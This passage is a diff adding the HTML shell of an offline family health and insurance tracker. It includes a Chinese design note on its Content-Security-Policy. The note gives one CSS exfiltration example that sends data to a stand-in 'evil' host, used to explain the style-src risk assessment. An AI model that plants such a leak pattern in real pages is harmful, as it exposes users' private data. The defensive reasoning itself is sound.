@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+  <!-- ============================================================
+       Content-Security-Policy —— 设计说明 / 风险评估（供以后审计或收紧策略时查阅）
+       更新日期：2026-08-06
+
+       目标：降低 XSS 的“利用后果”，而不是依赖它防住已知的输入转义问题
+       （转义问题另见 escapeHtml() 的使用审计，已逐一走查全部 innerHTML /
+       document.write 渲染路径，未发现未转义的用户输入）。
+
+       1. script-src 用 'self'（外部 app.js 文件），而不是哈希白名单：
+          - 本应用是纯静态单文件托管（无后端渲染），无法用随机 nonce（nonce 必须
+            每次请求由服务端重新生成且不可预测；写死在静态 HTML 里的 nonce
+            对攻击者同样可见，起不到防护作用）。
+          - 曾经试过对内联 <script> 整块内容做 SHA-256 哈希白名单，但这个方案
+            太脆弱：哈希必须和脚本字节内容精确匹配，本地算好之后 push 到
+            GitHub Pages，字节发生了变化（具体原因未完全查清，可能是 git 在
+            commit 时做了换行符/编码规整），导致部署后的哈希对不上，整个内联
+            脚本被 CSP 拦截，App 白屏——本地测试完全正常，只有部署后才会炸，
+            很难排查。
+          - 现在把这段脚本整体挪到独立的 app.js 文件，用
+            <script src="app.js"></script> 引入。外部脚本文件天然被
+            script-src 'self' 覆盖，不需要哈希，也就没有这个脆弱性——同时防护
+            效果不变：任何 XSS 注入的内联 <script> 或 onclick= 依然会被 CSP
+            拦截，因为它们不是来自 app.js。
+          - `scripts/update_csp_hash.py` 和 `.githooks/pre-commit` 是旧哈希方案
+            用的维护脚本，现在已经不需要了，保留只是历史记录（可以删除）。
+
+       2. 主文档里原来的 8 处 onclick="..." 已重构成 data-* 属性 + 一个
+          document 级别的委托 click 监听器（见文末“Delegated click handler”），
+          所以这 8 处不再需要 'unsafe-inline'。已确认：
+          - 这 8 处内嵌的都是内部生成的 UUID（m.id / memberId），不是用户输入，
+            所以重构前也没有属性逃逸风险，重构主要是为了让 CSP 能去掉
+            'unsafe-inline'。
+          - 文档里剩余的 onclick="window.print()" 和一处
+            <script>window.onload=...</script>，全部在 printWindow.document.write(...)
+            生成的独立弹出窗口文档里，不受本 <meta> CSP 约束（每个 window 有自己
+            的文档/CSP）。如果以后想连弹出窗口也一起收紧，需要在对应的
+            document.write 内容里单独加一份 CSP <meta>，本次未做（超出本次改动范围）。
+
+       3. style-src 保留了 'unsafe-inline'（结论：这里不收紧）：
+          - 应用大量使用内联 style="..." 属性和一个 <style> 块，全部改造成
+            class 需要重写全部渲染函数，工作量和本次改动的目标（收紧 script
+            执行）不成比例。
+          - 风险评估：CSS 注入的可利用面显著小于脚本注入 —— CSS 不能直接执行
+            任意代码，主要风险是“通过属性选择器探测/外泄页面上其它数据”，这类
+            攻击通常还需要能控制 CSS *内容本身* 加上外部网络请求（如
+            background:url(https://evil/?leak) 探测选择器命中）；本 CSP 的
+            connect-src/img-src 已限制到 'self'/data:/blob:，跨域外泄通道
+            基本被堵住，进一步降低了保留 style-src unsafe-inline 的实际风险。
+          - 如果以后要收紧：需要把所有 style="..." 迁移到预定义的 CSS class，
+            工作量较大，建议单独立项而不是顺带做。
+
+       4. frame-ancestors 没有写进这个 <meta> 标签：
+          - 这是 CSP 规范的限制，不是遗漏——frame-ancestors / sandbox 等指令
+            通过 <meta http-equiv> 声明时会被浏览器直接忽略，只有通过 HTTP
+            响应头（Content-Security-Policy 头）设置才生效。
+          - 如果需要防点击劫持，必须换一个能设自定义 HTTP 头的静态托管
+            （例如 Cloudflare Pages / Netlify 的 _headers 文件），GitHub Pages
+            本身不支持自定义响应头。这是本次改动已知但未解决的限制，留给
+            以后部署到支持自定义头的平台时再补。
+
+       5. img-src / frame-src 放开了 data: 和 blob:：
+          - data: 用于内置的 SVG favicon 以及附件缩略图（图片/PDF 都是先转成
+            data URL 存 IndexedDB，渲染时再用）。
+          - blob: 用于附件查看器（URL.createObjectURL 生成的 blob URL 赋给
+            <img>/<iframe> 预览图片和 PDF）和导出下载（a.href = blob URL）。
+          - 这两个 scheme 都只会指向“本机内存里生成的内容”，不会被攻击者
+            远程操控成外部地址，风险可控。
+
+       6. connect-src 'self'：应用是离线优先、纯本地存储（IndexedDB），代码里
+          没有 fetch()/XMLHttpRequest 调用，理论上可以设成 'none'，但留 'self'
+          是为了不影响 Service Worker 自身的资源请求，且几乎不增加实际风险。
+     ============================================================ -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'none';
+    script-src 'self' https://cdnjs.cloudflare.com;
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: blob:;
+    font-src 'self';
+    connect-src 'self';
+    frame-src 'self' blob:;
+    worker-src 'self';
+    manifest-src 'self';
+    object-src 'none';
+    base-uri 'none';
+    form-action 'none';
+  ">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Family Health & Shield</title>
+  <meta name="description" content="Family health records and insurance tracker with on-device encryption, works offline as an installable app.">
+  <meta name="theme-color" content="#0d9488">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Health & Shield">
+  <link rel="manifest" href="manifest.json">
+  <link rel="icon" type="image/png" sizes="32x32" href="icons/icon-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="icons/icon-16.png">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0' stop-color='%234f7cff'/%3E%3Cstop offset='1' stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='64' height='64' rx='14' fill='url(%23g)'/%3E%3Cpath d='M32 15c-9-11-24-2-22 10 1.5 9 12 16 22 24 10-8 20.5-15 22-24 2-12-13-21-22-10z' fill='white' opacity='0.95'/%3E%3Crect x='27.5' y='24' width='9' height='22' rx='2' fill='%234f7cff'/%3E%3Crect x='20' y='31.5' width='24' height='9' rx='2' fill='%234f7cff'/%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" sizes="180x180" href="icons/icon-180.png">
+  <link rel="shortcut icon" href="favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"
+    integrity="sha512-XMVd28F1oH/O71fzwBnV7HucLxVwtxf26XV8P4wPk26EDxuGZ91N8bsOttmnomcCD3CS5ZMRL50H0GgOHvegtg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <style>
+    :root {
+      --bg: #f5f7fa;
+      --surface: #ffffff;
+      --text: #1a1a2e;
+      --text-secondary: #6b7280;
+      --primary: #0d9488;
+      --primary-light: #ccfbf1;
+      --danger: #ef4444;
+      --danger-light: #fee2e2;
+      --warning: #f59e0b;
+      --warning-light: #fef3c7;
+      --success: #10b981;
+      --success-light: #d1fae5;
+      --border: #e5e7eb;
+      --radius: 12px;
+      --shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); }
+
+    .header { background: var(--surface); padding: 16px 24px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
+    .header h1 { font-size: 20px; font-weight: 700; color: var(--primary); }
+    .header-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+    .btn { padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; }
+    .btn-primary { background: var(--primary); color: white; }
+    .btn-primary:hover { opacity: 0.9; }
+    .btn-secondary { background: var(--bg); color: var(--text); border: 1px solid var(--border); }
+    .btn-secondary:hover { background: var(--border); }
+    .btn-danger { background: var(--danger-light); color: var(--danger); }
+    .btn-sm { padding: 6px 12px; font-size: 13px; }
+
+    .container { display: flex; height: calc(100vh - 65px); position: relative; }
+    .sidebar { width: 260px; background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; flex-shrink: 0; transition: transform 0.25s ease; }
+    .main { flex: 1; overflow-y: auto; padding: 20px; min-width: 0; }
+    .sidebar-toggle { display: none; }
+    .sidebar-backdrop { display: none; }
+
+    @media (max-width: 768px) {
+      .sidebar-toggle {
+        display: inline-flex; align-items: center; justify-content: center;
+        width: 36px; height: 36px; border-radius: 8px; border: 1px solid var(--border);
+        background: var(--surface); font-size: 18px; cursor: pointer; flex-shrink: 0;
+      }
+      .container { display: block; height: calc(100vh - 65px); }
+      .sidebar {
+        position: fixed; top: 65px; left: 0; bottom: 0;
+        width: 82%; max-width: 300px; z-index: 200;
+        transform: translateX(-100%);
+        box-shadow: 2px 0 16px rgba(0,0,0,0.2);
+      }
+      .sidebar.open { transform: translateX(0); }
+      .sidebar-backdrop.open {
+        display: block; position: fixed; top: 65px; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.35); z-index: 150;
+      }
+      .main { width: 100%; padding: 16px; }
+    }
+
+    .member-list { padding: 12px; }
+    .member-item { display: flex; align-items: center; gap: 12px; padding: 12px; border-radius: var(--radius); cursor: pointer; transition: all 0.2s; margin-bottom: 4px; }
+    .member-item:hover { background: var(--bg); }
+    .member-item.active { background: var(--primary-light); }
+    .member-avatar { width: 40px; height: 40px; border-radius: 50%; background: var(--primary); color: white; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 16px; }
+    .member-info { flex: 1; }
+    .member-name { font-weight: 600; font-size: 14px; }
+    .member-meta { font-size: 12px; color: var(--text-secondary); }
+    .add-member-btn { width: calc(100% - 24px); margin: 0 12px 12px; }
+
+    .card { background: var(--surface); border-radius: var(--radius); padding: 20px; margin-bottom: 16px; box-shadow: var(--shadow); }
+    .card-title { font-size: 16px; font-weight: 700; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; }
+    .stat-box { background: var(--bg); border-radius: 10px; padding: 16px; text-align: center; }
+    .stat-value { font-size: 24px; font-weight: 700; color: var(--primary); }
+    .stat-label { font-size: 12px; color: var(--text-secondary); margin-top: 4px; }
+
+    .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-size: 12px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
+    .info-value { font-size: 15px; font-weight: 600; }
+    .tag { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 12px; font-weight: 500; }
+    .tag-red { background: var(--danger-light); color: var(--danger); }
+    .tag-green { background: var(--success-light); color: var(--success); }
+    .tag-yellow { background: var(--warning-light); color: var(--warning); }
+    .tag-gray { background: var(--bg); color: var(--text-secondary); border: 1px solid var(--border); }
+
+    /* Insurance module */
+    .policy-card { background: var(--bg); border: 1.5px solid #d1d5db; border-radius: 10px; padding: 14px 16px; margin-bottom: 14px; box-shadow: 0 1px 2px rgba(0,0,0,0.04); }
+    .policy-card:hover { border-color: var(--primary); }
+    .policy-top { display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; }
+    .policy-title { font-weight: 700; font-size: 15px; }
+    .policy-sub { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
+    .policy-actions { display: flex; gap: 6px; flex-shrink: 0; }
+    .policy-actions span { cursor: pointer; font-size: 13px; padding: 4px 8px; border-radius: 6px; color: var(--text-secondary); }
+    .policy-actions span:hover { background: var(--border); }
+    .policy-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px,1fr)); gap: 10px; margin-top: 10px; }
+    .policy-field-label { font-size: 11px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
+    .policy-field-value { font-size: 14px; font-weight: 600; margin-top: 2px; }
+
+    .timeline { position: relative; padding-left: 24px; }
+    .timeline::before { content: ''; position: absolute; left: 7px; top: 0; bottom: 0; width: 2px; background: var(--border); }
+    .timeline-item { position: relative; margin-bottom: 16px; }
+    .timeline-dot { position: absolute; left: -20px; top: 4px; width: 12px; height: 12px; border-radius: 50%; background: var(--primary); border: 2px solid var(--surface); }
+    .timeline-dot.red { background: var(--danger); }
+    .timeline-dot.yellow { background: var(--warning); }
+    .timeline-dot.green { background: var(--success); }
+    .timeline-dot.purple { background: #8b5cf6; }
+    .timeline-content { background: var(--bg); border-radius: 10px; padding: 12px 16px; }
+    .timeline-date { font-size: 12px; color: var(--text-secondary); margin-bottom: 4px; }
+    .timeline-title { font-weight: 600; font-size: 14px; }
+    .timeline-desc { font-size: 13px; color: var(--text-secondary); margin-top: 4px; white-space: pre-wrap; }
+    .timeline-tags { display: flex; gap: 6px; margin-top: 8px; flex-wrap: wrap; }
+
+    .chart-container { height: 200px; position: relative; }
+    .chart-svg { width: 100%; height: 100%; }
+
+    .reminder-list { display: flex; flex-direction: column; gap: 8px; }
+    .reminder-item { display: flex; align-items: center; gap: 12px; padding: 12px; background: var(--bg); border-radius: 10px; }
+    .reminder-icon { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; }
+    .reminder-icon.overdue { background: var(--danger-light); }
+    .reminder-icon.upcoming { background: var(--warning-light); }
+    .reminder-icon.ok { background: var(--success-light); }
+    .reminder-text { flex: 1; }
+    .reminder-title { font-weight: 600; font-size: 14px; }
+    .reminder-date { font-size: 12px; color: var(--text-secondary); }
+
+    .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.4); display: none; align-items: center; justify-content: center; z-index: 100; }
+    .modal-overlay.active { display: flex; }
+    .modal { background: var(--surface); border-radius: var(--radius); width: 90%; max-width: 520px; max-height: 90vh; overflow-y: auto; padding: 24px; position: relative; }
+    .modal-close-x { position: absolute; top: 14px; right: 14px; cursor: pointer; font-size: 18px; line-height: 1; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; color: var(--text-secondary); z-index: 5; }
+    .modal-close-x:hover { background: var(--bg); color: var(--text); }
+
+    .toggle-switch { position: relative; display: inline-block; width: 44px; height: 24px; flex-shrink: 0; }
+    .toggle-switch input { opacity: 0; width: 0; height: 0; }
+    .toggle-slider { position: absolute; cursor: pointer; inset: 0; background: var(--border); border-radius: 24px; transition: 0.2s; }
+    .toggle-slider::before { content: ""; position: absolute; height: 18px; width: 18px; left: 3px; bottom: 3px; background: white; border-radius: 50%; transition: 0.2s; }
+    .toggle-switch input:checked + .toggle-slider { background: var(--primary); }
+    .toggle-switch input:checked + .toggle-slider::before { transform: translateX(20px); }
+    .toggle-switch input:disabled + .toggle-slider { opacity: 0.5; cursor: not-allowed; }
+    .toggle-row { display: flex; align-items: center; gap: 12px; }
+    .modal-header { font-size: 18px; font-weight: 700; margin-bottom: 20px; padding-right: 32px; }
+    .form-group { margin-bottom: 16px; }
+    .form-label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: var(--text-secondary); }
+    .form-input, .form-select, .form-textarea { width: 100%; padding: 10px 14px; border: 1px solid var(--border); border-radius: 8px; font-size: 14px; background: var(--surface); color: var(--text); }
+    .form-input:focus, .form-select:focus, .form-textarea:focus { outline: none; border-color: var(--primary); }
+    .form-textarea { min-height: 80px; resize: vertical; }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .modal-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 20px; }
+
+    .tabs { display: flex; gap: 4px; margin-bottom: 16px; background: var(--bg); padding: 4px; border-radius: 10px; }
+    .tab { flex: 1; padding: 8px; text-align: center; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 500; border: none; background: transparent; color: var(--text-secondary); }
+    .tab.active { background: var(--surface); color: var(--text); box-shadow: var(--shadow); }
+
+    .mode-switch { display: flex; gap: 8px; margin-bottom: 16px; }
+    .mode-btn { flex: 1; padding: 12px; text-align: center; border-radius: 10px; cursor: pointer; font-size: 15px; font-weight: 700; border: 2px solid var(--border); background: var(--surface); color: var(--text-secondary); transition: all 0.15s; }
+    .mode-btn:hover { border-color: var(--primary); }
+    .mode-btn.active { background: var(--primary); border-color: var(--primary); color: white; }
+
+    .vitals-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+    .vital-input { text-align: center; }
+    .vital-input .form-input { text-align: center; font-size: 18px; font-weight: 700; }
+    .vital-unit { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
+
+    .attachment-list { display: flex; flex-direction: column; gap: 8px; margin-top: 12px; }
+    .attachment-item { display: flex; align-items: center; gap: 10px; padding: 10px 12px; background: var(--bg); border-radius: 8px; cursor: pointer; transition: all 0.2s; }
+    .attachment-item:hover { background: var(--primary-light); }
+    .attachment-thumb { width: 48px; height: 48px; border-radius: 6px; object-fit: cover; background: var(--border); display: flex; align-items: center; justify-content: center; font-size: 20px; overflow: hidden; }
+    .attachment-thumb img { width: 100%; height: 100%; object-fit: cover; border-radius: 6px; }
+    .attachment-info { flex: 1; min-width: 0; }
+    .attachment-name { font-size: 13px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .attachment-path { font-size: 11px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .attachment-remove { padding: 4px 8px; font-size: 12px; color: var(--danger); cursor: pointer; border-radius: 4px; }
+    .attachment-remove:hover { background: var(--danger-light); }
+
+    .file-input-area { border: 2px dashed var(--border); border-radius: 10px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.2s; }
+    .file-input-area:hover { border-color: var(--primary); background: var(--primary-light); }
+    .file-input-area input { display: none; }
+
+    .empty-state { text-align: center; padding: 60px 20px; color: var(--text-secondary); }
+    .member-delete { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; color: var(--text-secondary); cursor: pointer; opacity: 0; transition: all 0.2s; }
+    .member-item:hover .member-delete { opacity: 1; }
+    .member-delete:hover { background: var(--danger-light); color: var(--danger); }
+
+    @media print {
+      .sidebar, .header, .btn { display: none !important; }
+      .main { padding: 0; }
+      .card { box-shadow: none; border: 1px solid #ddd; }
+    }
+  </style>
+</head>
+<body>
+  <div id="offlineBanner" style="display:none;position:fixed;top:0;left:0;right:0;z-index:10000;background:#f59e0b;color:#1a1a2e;font-size:12px;text-align:center;padding:4px 8px;">
+    📶 You're offline — the app keeps working; changes are saved on this device.
+  </div>
+  <!-- Full-app lock screen, shown before ANY data loads when encryption is enabled -->
+  <div id="appLockScreen" style="position:fixed;inset:0;background:var(--bg);z-index:9999;display:none;align-items:center;justify-content:center;padding:20px;">
+    <div style="max-width:380px;width:100%;background:var(--surface);border-radius:var(--radius);padding:32px;box-shadow:var(--shadow);">
+      <div style="text-align:center;font-size:40px;margin-bottom:12px;">🔒</div>
+      <h2 style="text-align:center;font-size:18px;margin-bottom:8px;">Family Health & Shield is Locked</h2>
+      <p style="text-align:center;font-size:13px;color:var(--text-secondary);margin-bottom:20px;">Enter your passcode to unlock your data.</p>
+      <div class="form-group">
+        <input type="password" class="form-input" id="appLockPasscodeInput" placeholder="Passcode">
+      </div>
+      <div id="appLockError" style="color:var(--danger);font-size:12px;margin-bottom:12px;text-align:center;"></div>
+      <button class="btn btn-primary" id="btnAppLockUnlock" style="width:100%;">Unlock</button>
+      <div id="appLockBioDivider" style="display:none;text-align:center;font-size:11px;color:var(--text-secondary);margin:12px 0;">or</div>
+      <button class="btn btn-secondary" id="btnAppLockBio" style="display:none;width:100%;">🫆 Unlock with Face ID / Fingerprint</button>
+    </div>
+  </div>
+  <div class="header">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <button class="sidebar-toggle" id="btnSidebarToggle" title="Show family members">☰</button>
+      <h1>🏥🛡️ Family Health & Shield</h1>
+    </div>
+    <div class="header-actions">
+      <button class="btn btn-secondary btn-sm" id="btnExport">📥 Export All</button>
+      <button class="btn btn-secondary btn-sm" id="btnExportMember">📤 Export Member</button>
+      <button class="btn btn-secondary btn-sm" id="btnImport">📥 Import</button>
+      <input type="file" id="importFile" style="display:none" accept=".json,.zip">
+      <button class="btn btn-secondary btn-sm" id="btnZip">📦 Pack ZIP</button>
+      <button class="btn btn-secondary btn-sm" id="btnSecurity">🔒 Security</button>
+      <button class="btn btn-primary btn-sm" id="btnAddRecord">+ Add Record</button>
+    </div>
+  </div>
+  <div style="background:var(--warning-light);color:#92620a;font-size:12px;padding:6px 20px;text-align:center;">
+    ⚠️ Exports (Export All / Export Member / Pack ZIP) now let you choose to encrypt each backup — but if you choose plaintext, that file has no password protection. Keep any plaintext backup somewhere safe (not a shared drive or public cloud folder).
+  </div>
+
+  <div class="container">
+    <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
+    <div class="sidebar" id="sidebarPanel">
+      <div class="member-list" id="memberList"></div>
+      <button class="btn btn-secondary add-member-btn" id="btnAddMember">+ Add Member</button>
+      <button class="btn btn-secondary add-member-btn" id="btnReset" style="margin-top:4px;font-size:12px;">🗑️ Clear All Data</button>
+      <button class="btn btn-secondary add-member-btn" id="btnCompact" style="margin-top:4px;font-size:12px;">🗜️ Compact Photos</button>
+      <div id="storageMeter" style="margin-top:10px;padding:8px 10px;font-size:11px;color:var(--text-secondary);background:var(--bg);border-radius:8px;"></div>
+    </div>
+
+    <div class="main" id="mainContent"></div>
+  </div>
+
+  <!-- Member Modal -->
+  <div class="modal-overlay" id="memberModal">
+    <div class="modal">
+      <div class="modal-header">Add Family Member</div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Name *</label>
+          <input class="form-input" id="mName" placeholder="e.g. Dad">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Chinese Name (optional)</label>
+          <input class="form-input" id="mNameZh" placeholder="e.g. 爸爸">
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Gender</label>
+          <select class="form-select" id="mGender">
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Birth Date</label>
+          <input class="form-input" type="date" id="mBirth">
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Blood Type</label>
+          <select class="form-select" id="mBlood">
+            <option value="Unknown">Unknown</option>
+            <option value="A">A</option>
+            <option value="B">B</option>
+            <option value="AB">AB</option>
+            <option value="O">O</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Height (cm)</label>
+          <input class="form-input" type="number" id="mHeight" placeholder="170">
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Blood Type Test Report (optional)</label>
+        <input type="file" id="mBloodAttachment" accept="image/*,.pdf" style="display:none">
+        <div class="file-input-area" id="bloodFileDropArea" style="padding:12px;">
+          <div style="font-size:12px;color:var(--text-secondary);">📎 Click to attach proof (photo/PDF of blood test result)</div>
+        </div>
+        <div class="attachment-list" id="bloodAttachmentPreview"></div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Allergies</label>
+        <input class="form-input" id="mAllergies" placeholder="e.g. Penicillin, Peanuts (comma separated)">
+      </div>
+      <div class="form-group">
+        <label class="form-label">Medical History</label>
+        <textarea class="form-textarea" id="mHistory" placeholder="e.g. Hypertension for 5 years, appendectomy in 2020"></textarea>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Emergency Contact</label>
+        <input class="form-input" id="mEmergency" placeholder="Name - Phone">
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnCancelMember">Cancel</button>
+        <button class="btn btn-primary" id="btnSaveMember">Save</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Record Modal -->
+  <div class="modal-overlay" id="recordModal">
+    <div class="modal">
+      <div class="modal-header">Add Health Record</div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Date</label>
+          <input class="form-input" type="date" id="rDate">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Type</label>
+          <select class="form-select" id="rType">
+            <option value="Checkup">🏥 Checkup</option>
+            <option value="Vaccine">💉 Vaccine</option>
+            <option value="Illness">🤒 Illness</option>
+            <option value="Hospitalization">🚑 Hospitalization</option>
+            <option value="Medication">💊 Medication</option>
+            <option value="Lab Test">🔬 Lab Test</option>
+            <option value="Monitoring">📊 Monitoring</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Title</label>
+        <input class="form-input" id="rTitle" placeholder="e.g. Annual Physical">
+      </div>
+
+      <div id="vitalsSection">
+        <label class="form-label">Vitals (Optional)</label>
+        <div class="vitals-grid">
+          <div class="vital-input">
+            <input class="form-input" type="number" id="vSystolic" placeholder="120">
+            <div class="vital-unit">Systolic mmHg</div>
+          </div>
+          <div class="vital-input">
+            <input class="form-input" type="number" id="vDiastolic" placeholder="80">
+            <div class="vital-unit">Diastolic mmHg</div>
+          </div>
+          <div class="vital-input">
+            <input class="form-input" type="number" id="vHeartRate" placeholder="72">
+            <div class="vital-unit">Heart Rate bpm</div>
+          </div>
+          <div class="vital-input">
+            <input class="form-input" type="number" step="0.1" id="vTemp" placeholder="36.5">
+            <div class="vital-unit">Temp °C</div>
+          </div>
+          <div class="vital-input">
+            <input class="form-input" type="number" id="vGlucose" placeholder="5.6">
+            <div class="vital-unit">Glucose mmol/L</div>
+          </div>
+          <div class="vital-input">
+            <input class="form-input" type="number" step="0.1" id="vWeight" placeholder="65">
+            <div class="vital-unit">Weight kg</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-group" style="margin-top: 16px;">
+        <label class="form-label">Details</label>
+        <textarea class="form-textarea" id="rDetails" placeholder="Symptoms, doctor notes, prescriptions..."></textarea>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Tags (comma separated)</label>
+        <input class="form-input" id="rTags" placeholder="e.g. annual,cardio,followup">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Attachments (Photo / PDF)</label>
+        <input type="file" id="rAttachments" multiple accept="image/*,.pdf" style="display:none">
+        <div class="file-input-area" id="fileDropArea">
+          <div style="font-size: 24px; margin-bottom: 8px;">📎</div>
+          <div style="font-size: 13px; color: var(--text-secondary);">Click to select files</div>
+          <div style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">JPG, PNG, PDF supported - stored in the app, click any attachment later to view it</div>
+        </div>
+        <div class="attachment-list" id="attachmentPreview"></div>
+      </div>
+
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnCancelRecord">Cancel</button>
+        <button class="btn btn-primary" id="btnSaveRecord">Save</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Report Preview Modal -->
+  <div class="modal-overlay" id="reportModal">
+    <div class="modal" style="max-width:600px;">
+      <div class="modal-header" id="reportModalTitle">Report Preview</div>
+      <div id="reportModalSummary" style="font-size:13px;color:var(--text-secondary);margin-bottom:16px;"></div>
+      <div id="reportModalAttachments"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnCancelReport">Close</button>
+        <button class="btn btn-primary" id="btnPrintReport">👁️ View Report</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Attachment Viewer Modal (images/PDFs render in-page - no window.open,
+       which flickers/opens behind the app when installed as a standalone PWA) -->
+  <div class="modal-overlay" id="attachmentViewerModal">
+    <div class="modal" style="max-width:720px;">
+      <div class="modal-header" id="attachmentViewerTitle">Attachment</div>
+      <div id="attachmentViewerBody" style="display:flex;align-items:center;justify-content:center;min-height:200px;background:var(--bg);border-radius:8px;overflow:hidden;"></div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnCloseAttachmentViewer">Close</button>
+        <a class="btn btn-primary" id="btnDownloadAttachment" download style="text-decoration:none;">⬇️ Download</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Custom Reminder Modal -->
+  <div class="modal-overlay" id="reminderModal">
+    <div class="modal">
+      <div class="modal-header" id="reminderModalTitle">Add Reminder</div>
+      <div class="form-group">
+        <label class="form-label">Title</label>
+        <input class="form-input" id="cReminderTitle" placeholder="e.g. Hepatitis B Antibody Test">
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Due Date</label>
+          <input class="form-input" type="date" id="cReminderDate">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Repeat</label>
+          <select class="form-select" id="cReminderRepeat">
+            <option value="0">Does not repeat</option>
+            <option value="6">Every 6 months</option>
+            <option value="12">Every year</option>
+            <option value="24">Every 2 years</option>
+            <option value="36">Every 3 years</option>
+            <option value="60">Every 5 years</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Notes (optional)</label>
+        <input class="form-input" id="cReminderNotes" placeholder="e.g. Check titre level, bring past results">
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-secondary" id="btnCancelReminder">Cancel</button>
+        <button class="btn btn-primary" id="btnSaveReminder">Save</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Security / Encryption Modal -->
+  <div class="modal-overlay" id="securityModal">
+    <div class="modal">
+      <div class="modal-header">🔒 Attachment Encryption</div>
+      <div id="securitySetupSection">
+        <p style="font-size:13px;color:var(--text-secondary);margin-bottom:14px;">
+          Protect your stored photos/PDFs (health records + insurance documents) with a passcode.
+          Files are encrypted on this device using AES-256-GCM (via PBKDF2 key derivation) before being saved.
+        </p>
+        <p style="font-size:12px;background:var(--danger-light);color:var(--danger);padding:8px 10px;border-radius:8px;margin-bottom:14px;">
+          ⚠️ There is no password recovery. If you forget this passcode, encrypted attachments cannot be recovered — ever.
+        </p>
+        <div class="form-group">
+          <label class="form-label">Create Passcode</label>
+          <input type="password" class="form-input" id="secPasscode1" placeholder="At least 6 characters">
+        </div>
